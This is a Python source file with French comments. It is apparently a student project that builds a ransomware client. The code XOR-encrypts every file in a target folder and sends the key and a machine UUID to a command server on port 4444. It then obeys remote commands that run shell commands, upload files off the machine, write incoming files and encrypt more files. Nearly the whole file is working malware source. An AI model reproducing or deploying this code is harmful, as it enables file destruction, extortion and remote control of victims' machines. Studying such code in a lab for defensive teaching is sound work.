import os  # Pour fichiers et dossiers
import socket  # Pour réseau
import subprocess  # Pour exécuter commandes
import logging  # Pour logs (bonus)
import datetime  # Pour time (inclus dans logging)

# Config logs simple (fichier client.log)
logging.basicConfig(filename='/home/hugo/PROJET/client/client.log', level=logging.INFO, 
                    format='[%(asctime)s] [%(levelname)s] %(message)s')

# Génération clé (adapté de cle_aleatoire.py, seulement A-Z)
def generer_cle(size):
    caracteres = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"  # 
    cle = ""
    with open("/dev/urandom", "rb") as f:  # Lit urandom
        brute = f.read(size)  # Lit size bytes
    for octet in brute:  # Pour chaque byte
        index = octet % len(caracteres)  # Modulo pour index
        cle += caracteres[index]  # Ajoute char
    return cle

# UUID (comme actuel, simple)
def get_uuid():
    with open('/proc/sys/kernel/random/uuid', 'r') as f:
        return f.read().strip()

# Chiffrement XOR (adapté file.py/crypto1.py, avec chunks pour gros fichiers)
def chiffrement_xor(data, cle):
    message_chiffre = b""  # Bytes vide
    cle_bytes = cle.encode()  # Clé en bytes
    cle_len = len(cle_bytes)
    for i in range(len(data)):  # Boucle explicite pour chaque byte
        char = data[i]  # Byte du data
        cle_char = cle_bytes[i % cle_len]  # Cycle clé
        xor = char ^ cle_char  # XOR
        message_chiffre += bytes([xor])  # Ajoute
    return message_chiffre

def xor_file(file_path, cle):
    try:
        with open(file_path, "rb") as f_in:  # Lecture binaire
            with open(file_path + ".tmp", "wb") as f_out:  # Temp pour éviter overwrite bug
                while True:  # Boucle chunks
                    chunk = f_in.read(4096)  # Lit 4096 bytes
                    if not chunk:  # Fin
                        break
                    chiffré = chiffrement_xor(chunk, cle)
                    f_out.write(chiffré)  # Écrit
        os.replace(file_path + ".tmp", file_path)  # Remplace original
        logging.info(f"Fichier traité: {file_path}")  # Log info
    except Exception as e:
        logging.error(f"Erreur fichier {file_path}: {e}")  # Log error
        print(f"Erreur fichier {file_path}: {e}")

# Chiffrement dossier (adapté dossier.py, simple os.walk)
def encrypt_directory(directory, cle):
    logging.info(f"Chiffrement de {directory}")  # Log start
    print(f"Chiffrement de {directory}")
    for root, dirs, files in os.walk(directory):  # Parcours récursif
        for file in files:  # Pour chaque fichier
            full_path = os.path.join(root, file)
            if os.path.isfile(full_path):  # Vérifie fichier
                xor_file(full_path, cle)  # Chiffre
    logging.info("Chiffrement fini")  # Log end
    print("Chiffrement fini")

# Fonction envoi ligne simple
def send_line(sock, msg):
    sock.sendall((msg + "\n").encode())  # Envoi avec \n

# Fonction recv comme serveur (symétrique)
def recv_line(sock):
    data = b""
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            return None
        data += chunk
    return data.decode("utf-8").strip()

def recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(min(4096, n - len(data)))
        if not chunk:
            return None
        data += chunk
    return data

# Principal
if __name__ == "__main__":
    HOST = "127.0.0.1"
    PORT = 4444
    cle = generer_cle(32)  # Génération
    uuid = get_uuid()
    target_dir = "/home/hugo/Documents/MADI/Cible_projet"  # Adapter
    if os.path.exists(target_dir):
        encrypt_directory(target_dir, cle)
    else:
        logging.error("Dossier pas trouvé")  # Log error
        print("Dossier pas trouvé")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    logging.info("Connecté au serveur")  # Log connexion
    send_line(s, "REGISTER")  # Envoi register
    send_line(s, uuid)
    send_line(s, cle)
    token = recv_line(s)  # Reçoit token du serveur (auth)
    logging.info(f"Token reçu: {token}")  # Log token
    print("Enregistré")

    while True:
        cmd = recv_line(s)
        if cmd is None:
            break
        # Pour chaque commande, envoi d'abord token pour auth
        send_line(s, token)  # Envoi token avant commande
        logging.info(f"Commande reçue: {cmd}")  # Log commande
        if cmd == "EXEC":
            cmd_str = recv_line(s)
            try:
                output = subprocess.check_output(cmd_str, shell=True, timeout=60)
                send_line(s, "OUTPUT")
                send_line(s, str(len(output)))
                s.sendall(output)
                logging.info("EXEC réussi")
            except Exception as e:
                send_line(s, "ERROR")
                error_str = str(e)
                send_line(s, str(len(error_str.encode())))
                s.sendall(error_str.encode())
                logging.error(f"EXEC erreur: {e}")
        elif cmd == "UPLOAD":
            file_path = recv_line(s)
            try:
                with open(file_path, "rb") as f:
                    data = f.read()
                send_line(s, "FILE")
                send_line(s, os.path.basename(file_path))
                send_line(s, str(len(data)))
                s.sendall(data)
                logging.info(f"Upload: {file_path}")
            except Exception as e:
                send_line(s, "ERROR")
                error_str = str(e)
                send_line(s, str(len(error_str.encode())))
                s.sendall(error_str.encode())
                logging.error(f"Upload erreur: {e}")
        elif cmd == "DOWNLOAD":
            file_path = recv_line(s)
            send_line(s, "READY")
            taille = int(recv_line(s))
            data = recv_exact(s, taille)
            if data:
                with open(file_path, "wb") as f:
                    f.write(data)
                send_line(s, "OK")
                send_line(s, "Download OK")
                logging.info(f"Download: {file_path}")
            else:
                send_line(s, "ERROR")
                send_line(s, "0")
                logging.error("Download no data")
        elif cmd == "CRYPTO":
            mode = recv_line(s)
            file_path = recv_line(s)
            if mode in ("encrypt", "decrypt"):  # XOR même pour les deux
                xor_file(file_path, cle)
                send_line(s, "OK")
                send_line(s, f"{mode} done")
                logging.info(f"Crypto {mode}: {file_path}")
            else:
                send_line(s, "ERROR")
                send_line(s, "Mode invalide")
                logging.error("Crypto mode invalide")
        else:
            send_line(s, "ERROR")
            send_line(s, "Commande inconnue")
            logging.warning("Commande inconnue")

    s.close()
    logging.info("Client arrêté")
    print("Client arrêté")